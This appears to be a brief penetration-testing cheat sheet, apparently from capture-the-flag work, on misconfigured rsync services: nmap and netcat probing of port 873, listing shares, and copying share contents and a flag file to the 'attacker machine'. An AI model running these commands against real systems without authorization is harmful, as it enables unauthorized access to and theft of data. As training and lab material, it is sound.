
## Info

- [Rsync](https://linux.die.net/man/1/rsync) is a fast and efficient tool for copying files locally and remotely.
    
- Can be used **without authentication** if misconfigured.
    

---

## Guide

- [HackTricks Rsync Guide](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)
    
- Abuse cases:
    
    - List contents of a shared folder on the target.
        
    - Retrieve files locally.
        
    - Test for password re-use if credentials are found elsewhere.
        

---

## Nmap Rsync

Scan for Rsync service:

```bash
sudo nmap -sV -p 873 127.0.0.1
```

---

## Probing for Accessible Shares

```bash
nc -nv 127.0.0.1 873
```

Example output:

```
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
dev            	Dev Tools
@RSYNCD: EXIT
```

---

## Enumerating Accessible Share

List the contents of a share:

```bash
rsync -av --list-only rsync://127.0.0.1/dev
rsync rsync://10.129.225.48/ --list-only
```

---

## Syncing Shares to Attacker Machine

Copy entire share to local system:

```bash
rsync -av rsync://127.0.0.1/dev
```

Over SSH (default or custom port):

```bash
rsync -av -e ssh user@target:/path /local/path
rsync -av -e "ssh -p2222" user@target:/path /local/path
```

---

## Downloading Contents of a Share

Retrieve specific file:

```bash
rsync rsync://10.129.225.48/public/flag.txt .
```